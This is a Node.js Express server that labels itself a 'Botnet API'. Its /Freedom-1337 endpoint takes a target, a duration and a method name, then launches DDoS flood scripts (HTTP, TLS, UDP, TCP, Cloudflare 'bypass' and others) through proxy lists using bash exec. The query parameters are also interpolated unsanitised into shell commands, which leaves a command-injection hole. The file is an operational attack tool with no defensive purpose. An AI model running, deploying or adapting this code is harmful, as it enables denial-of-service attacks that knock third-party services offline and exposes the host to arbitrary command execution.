const express = require("express");
const { exec } = require("child_process");
const axios = require("axios");
const os = require("os");

const app = express();
app.use(express.json());

// 🔥 AUTO-DETECT PORT (SUPPORT CODESPACE)
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

// 🔥 AUTO-DETECT IP PUBLIK & PRIVAT
async function getIPInfo() {
    try {
        const publicIP = (await axios.get("https://api64.ipify.org?format=json")).data.ip;
        const privateIP = Object.values(os.networkInterfaces())
            .flat()
            .find((iface) => iface.family === "IPv4" && !iface.internal)?.address || "UNKNOWN";

        console.log(`✅ Botnet API Ready!`);
        console.log(`🌍 PUBLIC  : http://${publicIP}:${port}/Freedom-1337`);
        console.log(`🏠 PRIVATE : http://${privateIP}:${port}/Freedom-1337`);

        return { publicIP, privateIP };
    } catch (error) {
        console.error("❌ ERROR AMBIL IP:", error);
        return { publicIP: "UNKNOWN", privateIP: "UNKNOWN" };
    }
}

// 🔥 EXECUTE FUNCTION (CODESPACE-SAFE)
function executeCommand(cmd) {
    console.log(`⚡ Executing: ${cmd}`);
    exec(cmd, { shell: "/bin/bash" }, (error, stdout, stderr) => {
        if (error) {
            console.error(`❌ ERROR: ${stderr}`);
            return;
        }
        console.log(`✅ OUTPUT:\n${stdout}`);
    });
}

// 🔥 API ENDPOINT (EKSEKUSI SERANGAN)
app.get("/Freedom-1337", (req, res) => {
    const { target, time, methods } = req.query;

    if (!target || !time || !methods) {
        return res.status(400).json({ status: "error", message: "Missing parameters!" });
    }

    res.status(200).json({
        status: "success",
        message: "Executing attack...",
        target,
        time,
        methods
    });

    // 🔥 EXECUTE COMMAND SESUAI METODE
    const methodMap = {
        "hypersonic.go": `/home/container/go/go/bin/go run hypersonic.go ${target} ${time}`,
        "mix": `node methods/2.js ${target} ${time} 100 10 proxy.txt`,
        "strike": `node methods/3.js GET ${target} ${time} 10 90 proxy.txt --full --legit`,
        "tls": `node methods/99.js ${target} ${time} 100 10 proxy.txt`,
        "flood": `node methods/5.js ${target} ${time} 20 60 proxy.txt`,
        "https": `node methods/6.js ${target} ${time} 10 100 proxy.txt`,
        "raw": `node methods/7.js ${target} ${time}`,
        "http-raw": `node methods/7.js ${target} ${time}`,
        "tlsv2": `node methods/8.js ${target} ${time} 50 10`,
        "storm": `node methods/9.js ${target} ${time} 32 10 proxy.txt`,
        "destroy": `node methods/10.js ${target} ${time} 100 10 proxy.txt`,
        "bypass": `node methods/11.js ${target} ${time} 100 10 proxy.txt`,
        "glory": `node methods/12.js ${target} ${time} 32 8 proxy.txt`,
        "sigma": `node methods/12.js ${target} ${time} 32 10 proxy.txt`,
        "harder": `node methods/13.js ${target} ${time} 32 8 proxy.txt`,
        "yeah": `node methods/13.js ${target} ${time} 32 10 proxy.txt`,
        "pluto": `node methods/14.js ${target} ${time}`,
        "uam": `node methods/15.js ${target} ${time} 9 3 proxy.txt`,
        "hold": `node methods/hold.js ${target}`,
        "httpx": `node methods/15.js ${target} ${time} 32 8 proxy.txt`,
        "udp": `node methods/udp.js ${target} 53 ${time}`,
        "tcp": `node methods/1.js ${target}:443 ${time}`,
        "java": `node methods/java.js ${target} ${time} 32 4 proxy.txt`
    };

    if (methodMap[methods]) {
        executeCommand(methodMap[methods]);
    } else {
        console.log("❌ Metode tidak dikenali!");
    }
});

// 🔥 ENDPOINT CEK STATUS (SUPPORT CODESPACE)
app.get("/Freedom-1337/status", async (req, res) => {
    const { publicIP, privateIP } = await getIPInfo();

    res.json({
        status: "online",
        uptime: process.uptime(),
        ip_public: publicIP,
        ip_private: privateIP,
        port
    });
});

// 🔥 START SERVER (SUPPORT CODESPACE)
app.listen(port, "0.0.0.0", async () => {
    await getIPInfo();
    console.log(`🚀 Server running on port ${port}`);
});
